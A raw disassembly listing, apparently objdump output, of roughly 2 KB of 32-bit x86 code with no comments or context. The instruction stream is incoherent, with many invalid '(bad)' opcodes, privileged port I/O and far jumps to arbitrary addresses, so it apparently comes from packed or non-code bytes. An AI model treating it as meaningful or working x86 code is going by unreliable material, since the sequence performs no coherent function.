  41855d:	push   edx
  41855e:	in     eax,dx
  41855f:	mov    al,ds:0x631c0dbe
  418564:	mov    edi,ecx
  418566:	fsubr  DWORD PTR [ebp+0x730e351c]
  41856c:	cmp    bl,BYTE PTR [esi-0x22f4b6fb]
  418572:	dec    ebp
  418573:	inc    ebp
  418574:	scas   al,BYTE PTR es:[edi]
  418575:	jnp    0x418531
  418577:	cli    
  418578:	stos   BYTE PTR es:[edi],al
  418579:	in     eax,dx
  41857a:	fs int3 
  41857c:	pop    esp
  41857d:	xchg   ebp,eax
  41857e:	aad    0x66
  418580:	jnp    0x418577
  418582:	imul   edx,DWORD PTR [edx],0x3106834
  418588:	xchg   esi,eax
  418589:	adc    DWORD PTR [eax+0x5efb9bb0],0x183a266b
  418593:	fmulp  st(3),st
  418595:	dec    eax
  418596:	aas    
  418597:	push   esp
  418598:	stc    
  418599:	push   0x3ed253d5
  41859e:	and    bh,bh
  4185a0:	pusha  
  4185a1:	push   0x5
  4185a3:	bound  ebx,QWORD PTR [esi]
  4185a5:	push   ebx
  4185a6:	sub    eax,DWORD PTR [eax-0x7a7329a4]
  4185ac:	popa   
  4185ad:	xor    BYTE PTR [esi],al
  4185af:	nop
  4185b0:	pop    ebp
  4185b1:	outs   dx,DWORD PTR ds:[esi]
  4185b2:	dec    BYTE PTR [ebp+eax*8-0x50]
  4185b6:	jl     0x4185cb
  4185b8:	test   al,0xf1
  4185ba:	mov    ah,0xb
  4185bc:	dec    eax
  4185bd:	pop    es
  4185be:	pop    edi
  4185bf:	fld    QWORD PTR [edi-0xf]
  4185c2:	inc    edi
  4185c3:	outs   dx,DWORD PTR ds:[esi]
  4185c4:	jns    0x418624
  4185c6:	mov    al,ds:0x81a2ec88
  4185cb:	arpl   WORD PTR ds:0xf53a68ae,ax
  4185d1:	out    0x7f,eax
  4185d3:	pop    ss
  4185d4:	sub    eax,0xad7de81d
  4185d9:	push   eax
  4185da:	idiv   edx
  4185dc:	mov    edx,0x136f52f9
  4185e1:	inc    edi
  4185e2:	dec    esi
  4185e3:	pop    ebx
  4185e4:	mov    dh,0x6d
  4185e6:	dec    esp
  4185e7:	push   edi
  4185e8:	addr16 arpl bp,cx
  4185eb:	mov    BYTE PTR [edi-0x49],al
  4185ee:	ds dec esp
  4185f0:	cmp    ecx,esp
  4185f2:	jg     0x418635
  4185f4:	fiadd  WORD PTR [ecx+edx*1-0x38bf882]
  4185fb:	xchg   edx,eax
  4185fc:	xlat   BYTE PTR ds:[ebx]
  4185fd:	mov    ebp,0x39f45012
  418602:	mov    BYTE PTR [ecx+0x72],al
  418605:	repz adc al,0x4b
  418608:	ja     0x418633
  41860a:	pop    eax
  41860b:	imul   ebp,DWORD PTR [eax+0x55fddcfa],0x31558362
  418615:	cwde   
  418616:	pop    edx
  418617:	cmc    
  418618:	into   
  418619:	mov    esi,DWORD PTR [eax-0x26751303]
  41861f:	sub    DWORD PTR [ecx+0x164b4da4],esp
  418625:	sbb    eax,0x3fc39cfb
  41862a:	scas   al,BYTE PTR es:[edi]
  41862b:	(bad)  
  41862c:	out    0xd4,eax
  41862e:	dec    esi
  41862f:	dec    ebp
  418630:	call   0x432d:0xe6a15a59
  418637:	push   ecx
  418638:	or     BYTE PTR [ecx],dh
  41863a:	push   esp
  41863b:	(bad)  ds:0x3c3f9af
  418641:	and    al,0x4b
  418643:	and    DWORD PTR [eax+0x58],ebx
  418646:	sbb    ch,dl
  418648:	scas   eax,DWORD PTR es:[edi]
  418649:	aaa    
  41864a:	mov    ch,0xaf
  41864c:	cli    
  41864d:	pop    esp
  41864e:	sub    BYTE PTR [eax-0x74d21173],cl
  418654:	or     al,0x53
  418656:	and    BYTE PTR [esi-0x269b593f],0xd8
  41865d:	fnsave [ebx-0x31]
  418660:	mov    edi,0xb3ddc851
  418665:	sar    BYTE PTR [edx-0x5bebc373],1
  41866b:	mov    ds:0xd08bcbc8,eax
  418670:	out    0xf1,eax
  418672:	xlat   BYTE PTR ds:[ebx]
  418673:	pop    es
  418674:	cmc    
  418675:	push   ecx
  418676:	call   0xb6f02aff
  41867b:	loope  0x418684
  41867d:	push   edi
  41867e:	hlt    
  41867f:	mov    esp,0xf5c92619
  418684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418685:	ins    DWORD PTR es:[edi],dx
  418686:	pop    ebx
  418687:	sbb    DWORD PTR [edi-0xb],ecx
  41868a:	dec    ebx
  41868b:	das    
  41868c:	adc    bh,BYTE PTR [ebx+ebx*2+0x530bdafa]
  418693:	test   BYTE PTR [edx],bh
  418695:	push   ds
  418696:	mov    cl,0x2
  418698:	add    ebx,DWORD PTR [edx+eiz*2-0x10]
  41869c:	loope  0x418626
  41869e:	lds    edx,FWORD PTR [esi]
  4186a0:	ret    0x8ff7
  4186a3:	sub    ebp,DWORD PTR [edx*1+0x2c3a7683]
  4186aa:	mov    ebp,DWORD PTR [esi+0x6488ddf7]
  4186b0:	dec    edx
  4186b1:	push   ecx
  4186b2:	jg     0x41865a
  4186b4:	test   BYTE PTR [ebp+0x4b62ebd9],dl
  4186ba:	in     al,0xe9
  4186bc:	push   es
  4186bd:	sub    BYTE PTR gs:[eax],dl
  4186c0:	inc    eax
  4186c1:	add    DWORD PTR [eax],edx
  4186c3:	fnstenv [eax+ebx*8-0x4a2fe9f8]
  4186ca:	fs in  eax,dx
  4186cc:	gs sbb eax,0xd8407fe9
  4186d2:	mov    al,0xcd
  4186d4:	inc    esi
  4186d5:	pop    esp
  4186d6:	or     DWORD PTR [eax-0x2],ecx
  4186d9:	fcomp  QWORD PTR [edx-0x4147323e]
  4186df:	inc    eax
  4186e0:	popf   
  4186e1:	rol    dl,cl
  4186e3:	call   0xd245:0x7c8fc80b
  4186ea:	inc    edx
  4186eb:	mov    esp,0xabbfd0e3
  4186f0:	hlt    
  4186f1:	pop    esp
  4186f2:	sti    
  4186f3:	rol    BYTE PTR [ecx+0x18],1
  4186f6:	dec    eax
  4186f7:	(bad)  
  4186f8:	jmp    0x53b6:0x79f45ba0
  4186ff:	mov    edx,0x14446bb8
  418704:	std    
  418705:	imul   ebp,DWORD PTR [edx-0x5b],0x76
  418709:	mov    dl,0xe9
  41870b:	ins    BYTE PTR es:[edi],dx
  41870c:	pop    ds
  41870d:	fsubr  DWORD PTR [edx+0x737c1a7d]
  418713:	pop    esi
  418714:	scas   eax,DWORD PTR es:[edi]
  418715:	pop    edx
  418716:	scas   eax,DWORD PTR es:[edi]
  418717:	push   ds
  418718:	push   eax
  418719:	adc    eax,0xcacd1010
  41871e:	ins    DWORD PTR es:[edi],dx
  41871f:	ins    DWORD PTR es:[edi],dx
  418720:	bound  eax,QWORD PTR [eax]
  418722:	or     DWORD PTR [eax-0x4e],ebx
  418725:	pop    esp
  418726:	lea    ebx,[esi]
  418728:	or     DWORD PTR [ebp+0x7b],edx
  41872b:	mov    esi,0xc8e747c0
  418730:	stos   DWORD PTR es:[edi],eax
  418731:	inc    ebp
  418732:	dec    cl
  418734:	stc    
  418735:	shl    ebp,0x22
  418738:	sub    ebp,DWORD PTR [ecx-0x208eadd7]
  41873e:	pop    ecx
  41873f:	cmp    edx,DWORD PTR [edx+0x5d98f959]
  418745:	call   0x123:0xd6449fe1
  41874c:	jo     0x41879e
  41874e:	mov    edx,0xfd6f7961
  418753:	cli    
  418754:	(bad)  
  418755:	push   0xdc3fb483
  41875a:	sbb    ecx,esp
  41875c:	(bad)  
  41875d:	cmp    bl,al
  41875f:	aad    0x64
  418761:	ss cmp edi,edi
  418764:	or     dh,BYTE PTR [eax+0x5b]
  418767:	mov    eax,0x61a2fa73
  41876c:	adc    eax,esp
  41876e:	cmp    DWORD PTR [edi-0x23],edi
  418771:	push   0xffffffc1
  418773:	mov    es,ecx
  418775:	adc    BYTE PTR [ecx+ebx*1-0x24],0xff
  41877a:	test   eax,0x67f75347
  41877f:	add    ecx,DWORD PTR [edi-0x3c18bcf6]
  418785:	push   ecx
  418786:	dec    ebx
  418787:	out    0xd0,eax
  418789:	cmc    
  41878a:	nop
  41878b:	fist   DWORD PTR [ebx]
  41878d:	mov    edi,0x2644330a
  418792:	mov    ch,0x63
  418794:	stos   DWORD PTR es:[edi],eax
  418795:	cs inc esp
  418797:	jmp    FWORD PTR [edi+ebp*4]
  41879a:	popf   
  41879b:	aad    0xc5
  41879d:	push   ss
  41879e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41879f:	ret    
  4187a0:	aad    0x12
  4187a2:	mov    DWORD PTR [edx-0x1b],edx
  4187a5:	mov    ebx,0xa30ef468
  4187aa:	sub    DWORD PTR [ecx-0x27811ab2],eax
  4187b0:	shl    ecx,0xeb
  4187b3:	ror    DWORD PTR [ebx-0x230b97b5],1
  4187b9:	pop    edx
  4187ba:	cld    
  4187bb:	fistp  DWORD PTR [esp+esi*1]
  4187be:	sbb    al,0xf
  4187c0:	cmp    bl,ah
  4187c2:	pop    esi
  4187c3:	sub    al,bl
  4187c5:	and    DWORD PTR [edi-0x2ffc3cf5],ebx
  4187cb:	pop    eax
  4187cc:	out    0xa5,al
  4187ce:	push   ss
  4187cf:	or     eax,0x507701cc
  4187d4:	ja     0x41883a
  4187d6:	add    BYTE PTR [edx],0x62
  4187d9:	inc    esi
  4187da:	(bad)  
  4187dc:	and    bl,BYTE PTR [ecx]
  4187de:	jbe    0x418760
  4187e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187e1:	sbb    DWORD PTR [ebx],eax
  4187e3:	push   eax
  4187e4:	add    DWORD PTR [ebx-0x52],0x62
  4187e8:	add    BYTE PTR [eax+edx*4-0x5b],dh
  4187ec:	inc    eax
  4187ed:	jbe    0x4187dc
  4187ef:	add    BYTE PTR ds:0xacd9a190,0x74
  4187f6:	fld    QWORD PTR [edi+0x4d1d6cce]
  4187fc:	cli    
  4187fd:	add    BYTE PTR [ecx],0xad
  418800:	(bad)  
  418801:	aaa    
  418802:	add    DWORD PTR ds:[edi+0x65],ebx
  418806:	jmp    0x3866bf9f
  41880b:	adc    ebp,eax
  41880d:	cld    
  41880e:	es stos BYTE PTR es:[edi],al
  418810:	push   edi
  418811:	and    BYTE PTR [eax+0x7],ah
  418814:	arpl   WORD PTR [edi+0x64],cx
  418817:	int3   
  418818:	cmp    eax,0xb912f468
  41881d:	mov    esp,0xfb49fb77
  418822:	push   eax
  418823:	inc    esp
  418824:	aas    
  418825:	repnz sbb al,0x4f
  418828:	mov    ebx,0xe8e3d313
  41882d:	jge    0x418853
  41882f:	ss cli 
  418831:	gs ret 0x63b2
  418835:	push   esi
  418836:	shl    DWORD PTR cs:[eax-0xaacfd25],0x0
  41883e:	cmc    
  41883f:	enter  0x733a,0x8f
  418843:	pop    edi
  418844:	sbb    DWORD PTR [eax+0x1d],edx
  418847:	dec    ebx
  418848:	cmp    ch,BYTE PTR ds:0xa22752b1
  41884e:	fs jno 0x418865
  418851:	imul   ebx,eax,0xffffffd8
  418854:	pop    esi
  418855:	sbb    ebp,ebx
  418857:	loop   0x41884a
  418859:	adc    DWORD PTR [esi],ecx
  41885b:	es lock popf 
  41885e:	clc    
  41885f:	pop    ebx
  418860:	and    ah,cl
  418862:	or     ecx,DWORD PTR [edx]
  418864:	call   0xc17c:0xb91f82d1
  41886b:	hlt    
  41886c:	sub    al,0xd2
  41886e:	mov    edi,0xd16044cb
  418873:	sbb    ah,BYTE PTR [esp+edi*1+0x75]
  418877:	xchg   esp,eax
  418878:	jmp    0x4188cd
  41887a:	sub    al,0x47
  41887c:	aam    0xc9
  41887e:	mov    ebx,0x43002970
  418883:	in     al,0xe5
  418885:	aaa    
  418886:	push   ebx
  418887:	and    DWORD PTR [edi+0x2e76d693],esp
  41888d:	jne    0x4188c8
  41888f:	jle    0x418842
  418891:	inc    esp
  418892:	in     eax,dx
  418893:	scas   eax,DWORD PTR es:[edi]
  418894:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418895:	jmp    0x4bc346cd
  41889a:	and    al,0x29
  41889c:	dec    eax
  41889d:	loop   0x418856
  41889f:	div    DWORD PTR [edx*2-0x672f7a12]
  4188a6:	lock adc bh,bl
  4188a9:	sbb    ebx,DWORD PTR [ebx]
  4188ab:	rol    BYTE PTR [ecx+0x7c],1
  4188ae:	push   ds
  4188af:	retf   0x9e27
  4188b2:	jl     0x41883e
  4188b4:	pop    edx
  4188b5:	cdq    
  4188b6:	shr    eax,cl
  4188b8:	mov    cl,0x84
  4188ba:	shl    ah,1
  4188bc:	push   ebp
  4188bd:	jnp    0x418910
  4188bf:	imul   esp,DWORD PTR [ebx+esi*1],0x1cdd36de
  4188c6:	fidivr WORD PTR [esi]
  4188c8:	pop    ds
  4188c9:	sbb    eax,DWORD PTR [eax-0x2f]
  4188cc:	xor    eax,0x52c0075e
  4188d1:	and    DWORD PTR [ecx-0x1713f26],0x3b
  4188d8:	jnp    0x41893e
  4188da:	aas    
  4188db:	jb     0x418860
  4188dd:	fwait
  4188de:	lods   al,BYTE PTR ds:[esi]
  4188df:	pop    ds
  4188e0:	push   edi
  4188e1:	ret    0xc953
  4188e4:	sbb    DWORD PTR [ebp+0xc],eax
  4188e7:	and    al,0x74
  4188e9:	jmp    0xeca90ae0
  4188ee:	fstp   TBYTE PTR [esi+0x684a0c59]
  4188f4:	clc    
  4188f5:	pop    ebx
  4188f7:	rcr    BYTE PTR [ecx-0x5a],cl
  4188fa:	popf   
  4188fb:	inc    edx
  4188fc:	push   ds
  4188fd:	aad    0xb3
  4188ff:	sbb    ecx,DWORD PTR [ecx+ebx*8+0x41d6a762]
  418906:	cdq    
  418907:	pop    edx
  418908:	cwde   
  418909:	aaa    
  41890a:	add    eax,0xb400c75e
  41890f:	addr16 in eax,dx
  418911:	sub    eax,0x25a39b82
  418916:	add    BYTE PTR [esi],dl
  418918:	cs jecxz 0x4188ce
  41891b:	in     al,0xcd
  41891d:	das    
  41891e:	mov    al,ds:0xe67051ef
  418923:	jp     0x4189a3
  418925:	dec    eax
  418926:	or     eax,0xbd69f9fc
  41892b:	push   edx
  41892c:	fwait
  41892d:	mov    ch,0xad
  41892f:	inc    esi
  418930:	shl    DWORD PTR [ecx-0x488a236c],cl
  418936:	aaa    
  418937:	(bad)
  41893b:	popa   
  41893c:	fimul  WORD PTR [eax+0xc]
  41893f:	rcl    DWORD PTR [edx+0x7b],1
  418942:	jae    0x418968
  418944:	in     al,dx
  418945:	sub    eax,0x286ebdd6
  41894a:	es nop
  41894c:	xchg   ebx,eax
  41894d:	mov    al,0xd
  41894f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418950:	and    al,0x1c
  418952:	and    edx,DWORD PTR [ebx-0x1440e38f]
  418958:	mov    ecx,0x81bc0583
  41895d:	xchg   DWORD PTR [esi-0x528ab26d],ebx
  418963:	push   ebx
  418964:	adc    esi,edx
  418966:	aaa    
  418967:	sub    DWORD PTR [ebp-0x23dacc3f],ebx
  41896d:	into   
  41896e:	dec    eax
  41896f:	retf   
  418970:	inc    ecx
  418971:	fisttp WORD PTR [ebx-0x44677f3]
  418977:	cmp    al,0x58
  418979:	and    eax,0xf9196534
  41897e:	lods   eax,DWORD PTR ds:[esi]
  41897f:	aam    0xf8
  418981:	or     bh,BYTE PTR [eax+0x15]
  418984:	loopne 0x418915
  418986:	or     edx,DWORD PTR [edi]
  418988:	hlt    
  418989:	xchg   ecx,eax
  41898a:	repz icebp 
  41898c:	mov    BYTE PTR [eax+0x6bbf85c0],cl
  418992:	into   
  418993:	in     al,0x11
  418995:	pop    edx
  418996:	or     eax,0xc83c0fa8
  41899b:	cmp    al,0x2
  41899d:	ds pop ss
  41899f:	(bad)  [eax+eax*2+0x0]
  4189a3:	daa    
  4189a4:	add    edi,esp
  4189a6:	(bad)  
  4189a7:	imul   ecx
  4189a9:	dec    eax
  4189aa:	cld    
  4189ab:	stc    
  4189ac:	pop    esi
  4189ad:	mov    dh,BYTE PTR [edi]
  4189af:	sub    ecx,ebx
  4189b1:	in     eax,dx
  4189b2:	jmp    0x4dfc6da4
  4189b7:	sub    ecx,DWORD PTR ds:0x377b3eb2
  4189bd:	add    eax,0xb6e703d8
  4189c2:	dec    eax
  4189c3:	retf   0x3ef7
  4189c6:	and    ebp,edi
  4189c8:	int3   
  4189c9:	mov    ecx,0x3dfc5be7
  4189ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189cf:	scas   al,BYTE PTR es:[edi]
  4189d0:	fidiv  DWORD PTR [ebx+0x2d]
  4189d3:	and    ch,dh
  4189d5:	pop    ecx
  4189d6:	ja     0x418990
  4189d8:	repnz pop eax
  4189da:	jne    0x418984
  4189dc:	ficom  WORD PTR [edi+ebp*2]
  4189df:	adc    al,0xc6
  4189e1:	ins    BYTE PTR es:[edi],dx
  4189e2:	cmp    esp,DWORD PTR [ebx+0x42]
  4189e5:	xor    bl,cl
  4189e7:	dec    esi
  4189e8:	clc    
  4189e9:	ret    
  4189ea:	jmp    0x418a37
  4189ec:	jecxz  0x4189f6
  4189ee:	pop    ebp
  4189ef:	cmc    
  4189f0:	pop    ebx
  4189f1:	push   eax
  4189f2:	addr16 mov dl,0x18
  4189f5:	cmp    ah,dh
  4189f7:	cli    
  4189f8:	hlt    
  4189f9:	enter  0x5086,0xa7
  4189fd:	or     al,0x82
  4189ff:	das    
  418a00:	and    edx,DWORD PTR [ecx-0x6b]
  418a03:	sbb    al,0x31
  418a05:	ret    
  418a06:	mov    bl,0x23
  418a08:	xchg   edi,eax
  418a09:	jae    0x418a1b
  418a0b:	adc    edi,edx
  418a0d:	test   al,0x22
  418a0f:	jmp    0x4189ce
  418a11:	in     al,0xab
  418a13:	ja     0x4189a4
  418a15:	gs adc esi,DWORD PTR es:0x1e5d8da5
  418a1d:	cmp    eax,0x11a02063
  418a22:	mov    edi,0xb3d27205
  418a27:	and    al,0x71
  418a29:	adc    al,0xf0
  418a2b:	jmp    0x4189fa
  418a2d:	sbb    al,BYTE PTR ds:0x15c8d655
  418a33:	fadd   DWORD PTR [eax+esi*8-0x7f]
  418a37:	cmc    
  418a38:	jae    0x418ab0
  418a3a:	and    al,0x41
  418a3c:	dec    ebx
  418a3d:	jnp    0x418a9a
  418a3f:	out    0xa7,al
  418a41:	ss int 0x87
  418a44:	scas   eax,DWORD PTR es:[edi]
  418a45:	sbb    ch,BYTE PTR cs:[esi+0x15]
  418a49:	mov    ch,0x52
  418a4b:	aam    0xb0
  418a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a4e:	fistp  DWORD PTR [ebx+edx*8+0x268af2c4]
  418a55:	push   eax
  418a56:	rep outs dx,DWORD PTR ds:[esi]
  418a58:	std    
  418a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a5a:	mov    eax,0x9a7c9655
  418a5f:	dec    ebp
  418a60:	mov    WORD PTR [ebx],cs
  418a62:	sahf   
  418a63:	xor    edx,DWORD PTR [ebp-0x3d6cba88]
  418a69:	cld    
  418a6a:	pop    edi
  418a6b:	int3   
  418a6c:	fst    DWORD PTR [edi]
  418a6e:	cmp    BYTE PTR [edi+0x3c],ah
  418a71:	push   ebx
  418a72:	xor    ebp,esi
  418a74:	push   esp
  418a75:	je     0x418ad5
  418a77:	cwde   
  418a78:	fdiv   st(3),st
  418a7a:	fucomp st(2)
  418a7c:	mov    dh,0x5d
  418a7e:	fsubr  st,st(1)
  418a80:	jmp    0x77aad406
  418a85:	jno    0x418ac9
  418a87:	fldcw  WORD PTR [ebp+eiz*4-0x15daf94f]
  418a8e:	in     eax,0xf6
  418a90:	test   BYTE PTR [ebx-0x728a7d24],ch
  418a96:	mov    eax,0x9244c5aa
  418a9b:	inc    esi
  418a9c:	push   ss
  418a9d:	daa    
  418a9e:	push   edx
  418a9f:	jge    0x418b15
  418aa1:	add    cl,BYTE PTR [esp+esi*8-0x1e]
  418aa5:	stos   BYTE PTR es:[edi],al
  418aa6:	popw   ss
  418aa8:	xchg   edx,eax
  418aa9:	dec    esi
  418aaa:	sbb    ebx,DWORD PTR [eax+0x6b69915d]
  418ab0:	sbb    al,BYTE PTR [eax]
  418ab2:	mov    edx,0xe2e329c9
  418ab7:	pop    esi
  418ab8:	out    0x68,al
  418aba:	iret   
  418abb:	cli    
  418abc:	and    DWORD PTR [ebp+0x49],0x85903071
  418ac3:	sub    BYTE PTR [ebx+0xe],0xb1
  418ac7:	jle    0x418a73
  418ac9:	aas    
  418aca:	test   DWORD PTR [esi],edx
  418acc:	daa    
  418acd:	dec    ecx
  418ace:	push   ebp
  418acf:	imul   edi,DWORD PTR [ebx],0xfffffffd
  418ad2:	sbb    eax,0xc231317
  418ad7:	jmp    0xb176:0x8885f5d
  418ade:	cmc    
  418adf:	cmp    DWORD PTR [esi+edx*2+0x79],esp
  418ae3:	mov    es,edi
  418ae5:	out    dx,al
  418ae6:	mov    eax,ds:0x2c11d138
  418aeb:	lea    esi,ds:0xe67b4721
  418af1:	pop    ds
  418af2:	xlat   BYTE PTR ds:[ebx]
  418af3:	idiv   BYTE PTR [edi+eax*2+0x70]
  418af7:	mov    dl,0xfe
  418af9:	push   ss
  418afa:	adc    ah,BYTE PTR [ebp-0x7d0160f1]
  418b00:	mov    al,ds:0x1e80c325
  418b05:	xchg   ecx,eax
  418b06:	ins    BYTE PTR es:[edi],dx
  418b07:	sahf   
  418b08:	cmc    
  418b09:	jne    0x418b09
  418b0b:	(bad)  
  418b0d:	jecxz  0x418b22
  418b0f:	jp     0x418b07
  418b11:	mov    dl,0x83
  418b13:	mov    DWORD PTR [edi],ebx
  418b15:	push   ebp
  418b16:	arpl   WORD PTR [edx+ecx*4],bp
  418b19:	stc    
  418b1a:	test   ebx,0x61cba248
  418b20:	shl    BYTE PTR [eax-0x65a5a049],cl
  418b26:	icebp  
  418b27:	call   0x499b:0xa15088f3
  418b2e:	push   ebx
  418b2f:	test   BYTE PTR gs:[ecx-0x6cdda5e0],ah
  418b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b37:	inc    edx
  418b38:	push   eax
  418b39:	adc    ebp,DWORD PTR [edi]
  418b3b:	dec    esi
  418b3c:	repz scas eax,DWORD PTR es:[edi]
  418b3e:	sbb    ebp,DWORD PTR [ebx*4+0x71c1237a]
  418b45:	mov    edx,0xa2ae6b4c
  418b4a:	pop    ecx
  418b4b:	cmp    DWORD PTR [eax-0x4bca38a1],esi
  418b51:	cli    
  418b52:	fwait
  418b53:	ret    0xfe8
  418b56:	and    BYTE PTR [ebp+0x1ae719f2],bl
  418b5c:	mov    ecx,0xfa3c517f
  418b61:	add    DWORD PTR [ebx-0x19],edi
  418b64:	jmp    FWORD PTR [ecx-0x4adbaaf7]
  418b6a:	or     eax,0x5113ca26
  418b6f:	lds    ebp,FWORD PTR [ecx-0x5c7fef54]
  418b75:	outs   dx,BYTE PTR ds:[esi]
  418b76:	dec    esi
  418b77:	outs   dx,BYTE PTR ds:[esi]
  418b78:	and    al,0x6
  418b7a:	jecxz  0x418b24
  418b7c:	push   edi
  418b7d:	cmp    ah,BYTE PTR [edx]
  418b7f:	cmp    BYTE PTR [edi-0x45],bh
  418b82:	jae    0x418b05
  418b84:	js     0x418b60
  418b86:	dec    esp
  418b87:	rcl    DWORD PTR [esi+0x33],cl
  418b8a:	aaa    
  418b8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b8c:	sahf   
  418b8d:	mov    bl,0x8c
  418b8f:	mov    ebx,0xf0d193d8
  418b94:	jmp    0x9f77:0xe1dcaa17
  418b9b:	xor    edi,DWORD PTR [edx+0x4b7349a8]
  418ba1:	lock cmp ebx,DWORD PTR [edi]
  418ba4:	adc    esp,DWORD PTR [eax]
  418ba6:	stos   BYTE PTR es:[edi],al
  418ba7:	(bad)
  418baa:	arpl   si,di
  418bac:	push   ss
  418bad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bae:	in     eax,0xa7
  418bb0:	inc    edx
  418bb1:	call   0x33c952f5
  418bb6:	mov    bl,0x65
  418bb8:	(bad)  
  418bba:	push   ds
  418bbb:	js     0x418bff
  418bbd:	xchg   DWORD PTR [ebp+0x251ba8bd],ebx
  418bc3:	pop    esp
  418bc4:	imul   DWORD PTR [ecx+ebp*1-0x36]
  418bc8:	inc    ebx
  418bc9:	cmp    DWORD PTR [eax-0x4],eax
  418bcc:	push   esp
  418bcd:	hlt    
  418bce:	add    cl,al
  418bd0:	mov    dh,0x9e
  418bd2:	and    edx,DWORD PTR ds:0x85f9eda9
  418bd8:	mov    cl,0x91
  418bda:	loop   0x418b7d
  418bdc:	and    cl,BYTE PTR [ebx+0x54cda2d9]
  418be2:	mov    ds:0x7b304fc6,al
  418be7:	ins    DWORD PTR es:[edi],dx
  418be8:	xor    bl,ch
  418bea:	call   0x85b7:0xa750a3f9
  418bf1:	call   0x5ff4:0x23a9ae63
  418bf8:	ds add eax,0x4e7010ae
  418bfe:	(bad)  
  418bff:	lods   al,BYTE PTR ds:[esi]
  418c00:	out    0xd4,al
  418c02:	out    dx,al
  418c03:	jbe    0x418c22
  418c05:	xchg   ecx,eax
  418c06:	fmulp  st(2),st
  418c08:	mov    edx,0xede4cd08
  418c0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c0e:	mov    ?,WORD PTR [ebx]
  418c10:	and    dh,BYTE PTR [esi+eiz*2+0x2666e9cf]
  418c17:	(bad)  
  418c18:	mov    ebx,0xdf70cc4b
  418c1d:	repz (bad) 
  418c1f:	adc    edx,DWORD PTR [ebx+ebx*8+0x262daaea]
  418c26:	or     DWORD PTR [edx+0x2bae14a1],ecx
  418c2c:	jmp    0x418c6f
  418c2e:	test   eax,0x5486a829
  418c33:	mov    edi,0xa35bf57e
  418c38:	push   ebx
  418c39:	(bad)  
  418c3a:	setnp  BYTE PTR [edx-0x4c54c00a]
  418c41:	sub    eax,0x96a8db85
  418c46:	call   esp
  418c48:	xchg   edi,eax
  418c49:	jns    0x418caa
  418c4b:	add    ah,bl
  418c4d:	rol    BYTE PTR [esi-0x3f32fb64],1
  418c53:	ins    DWORD PTR es:[edi],dx
  418c54:	jbe    0x418c89
  418c56:	push   ss
  418c57:	imul   edi,DWORD PTR [ebp+0x23],0x6d
  418c5b:	call   0x71f129d9
  418c60:	gs sub eax,edi
  418c63:	mov    al,ds:0xa77791f5
  418c68:	mov    dl,0x6e
  418c6a:	lds    esi,FWORD PTR [edx*1-0x243223e1]
  418c71:	shr    BYTE PTR [ecx+0x3e9814b8],0xac
  418c78:	xor    BYTE PTR [ebx-0x5c],bl
  418c7b:	adc    BYTE PTR [eax],cl
  418c7d:	mov    ebp,0x7f8a5852
  418c82:	sahf   
  418c83:	mov    WORD PTR [esi],fs
  418c85:	push   esp
  418c86:	dec    ebx
  418c87:	xchg   cl,bh
  418c89:	mov    cl,BYTE PTR [ebp+edx*4+0x41404584]
  418c90:	inc    ebx
  418c91:	xor    dl,ah
  418c93:	jnp    0x418c8d
  418c95:	dec    ebp
  418c96:	inc    ecx
  418c97:	push   cs
  418c98:	inc    esp
  418c99:	pop    edi
  418c9a:	add    al,BYTE PTR [edx+0x4]
  418c9d:	xchg   esp,eax
  418c9e:	push   ebx
  418c9f:	xchg   DWORD PTR [eax-0x4f7ef097],ecx
  418ca5:	(bad)  
  418ca6:	in     eax,dx
  418ca7:	out    0xa8,al
  418ca9:	popa   
  418caa:	jle    0x418ccd
  418cac:	out    dx,eax
  418cad:	aaa    
  418cae:	push   esp
  418caf:	or     ebp,DWORD PTR [esi]
  418cb1:	sub    DWORD PTR [ebx-0x55228fc3],ecx
  418cb7:	add    eax,0x8032130e
  418cbc:	pop    ebx
  418cbd:	mov    al,ds:0x95dd8ab6
  418cc2:	cs dec edi
  418cc4:	outs   dx,DWORD PTR ds:[esi]
  418cc5:	sub    DWORD PTR [ebx-0x8],esp
  418cc8:	adc    dl,BYTE PTR [esi]
  418cca:	cmp    DWORD PTR [esi+ebp*8],esi
  418ccd:	xchg   edi,eax
  418cce:	jo     0x418cc2
  418cd0:	mov    DWORD PTR [ebp+0x9],ebp
  418cd3:	std    
  418cd4:	or     bh,dh
  418cd6:	iret   
  418cd7:	in     eax,0xba
  418cd9:	lods   al,BYTE PTR ds:[esi]
  418cda:	mov    ?,WORD PTR [edi]
  418cdc:	or     eax,0xf04088ff
  418ce1:	jmp    0x418d55
  418ce3:	adc    eax,0x8022ee46
  418ce8:	mov    bl,0x5
  418cea:	fist   WORD PTR [ebp+0x2f]
  418ced:	add    eax,DWORD PTR [edi-0x61]
  418cf0:	mov    ch,0xe1
  418cf2:	aaa    
  418cf3:	hlt    
  418cf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cf5:	inc    edx
  418cf6:	popf   
  418cf7:	sub    al,0xa2
  418cf9:	mov    ss,WORD PTR [ebx-0x22]
  418cfc:	and    DWORD PTR [eax+0xd],esi
  418cff:	cld    
  418d00:	and    eax,0x182c96e2
  418d05:	retf   0x198e
  418d08:	mul    BYTE PTR [edi]
  418d0a:	std    
  418d0b:	out    0xf7,eax
  418d0d:	push   cs
  418d0e:	pop    ds
  418d0f:	jae    0x418ccc
  418d11:	fld    QWORD PTR [eax-0x1b]
  418d14:	lock imul esi,edx,0xffffffff
  418d18:	test   BYTE PTR [ebp-0xb0d5577],dl
  418d1e:	loope  0x418d36
  418d20:	jg     0x418d0a
  418d22:	sub    BYTE PTR [ecx+0x30],dh
  418d25:	out    0xf6,al
  418d27:	pushf  
  418d28:	mov    ecx,0x1509b1a3
  418d2d:	sub    eax,0x1b2be4f9
  418d32:	and    BYTE PTR [edx-0x47],dl
  418d35:	jle    0x418d95
  418d37:	out    dx,al
  418d38:	retf   
  418d39:	pop    ebx
